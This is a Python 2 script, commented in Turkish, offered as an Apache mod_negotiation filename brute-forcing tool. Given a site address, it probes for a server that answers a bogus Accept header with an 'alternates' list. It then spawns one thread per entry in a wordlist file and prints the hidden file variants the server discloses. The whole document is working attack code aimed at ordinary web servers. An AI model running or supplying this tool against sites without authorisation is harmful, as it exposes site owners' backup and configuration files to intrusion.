#!/usr/bin/python
# -*- coding: utf-8 -*-
# Twitter Apache mod_negotiation filename bruteforcing tool
# twitter.com/0x94

from threading import Thread
import sys,colorama,requests
from time import sleep
import optparse
success = colorama.Fore.GREEN 
error = colorama.Fore.RED 


def islem(key,url,hoo):
    bak=False
    try:
        req=requests.get(url+"/"+key, headers={'Accept': 'only/0x94'})
        if req.headers["alternates"]:
            bak=True
            if hoo:
                print success+"\nKey="+key+"\n"+req.headers["alternates"]
    except:
        e="hata"
        
    return bak
        
def main(mainden):
    threads = []    
    xfile=open("raw.txt","r").readlines()
    for key in xfile:
        thread = Thread(target=islem, args=(key.rstrip(),mainden,True,))
        thread.start()
        threads.append(thread)

    for tx in threads:
        tx.join()

    print ("Program gorevini yapti")    
    sys.exit(0)  


if __name__ == '__main__':
    try:
        colorama.init(autoreset=True) #windows icin        
        parser = optparse.OptionParser()
        parser.add_option('-s',
            action = "store", 
            dest   = "site",
            type   = "string", 
            help = "ornek: ./apachebf.py -s http://www.site.com")
        (option,args) = parser.parse_args()
        if option.site == None:
            print "Site adresi girmedin"
            sys.exit(0)                    
        else:
            if islem("index",option.site,False):
                print success+"Bu Adreste bug var, otomatik denenmeye yonlendiriliyorsunuz"
                main(option.site)
            else:
                print error+"Bug Bulamadim :("                
                sys.exit(0)   
    except KeyboardInterrupt:
        print('\n Bir tusa basildi.')
        os._exit(1)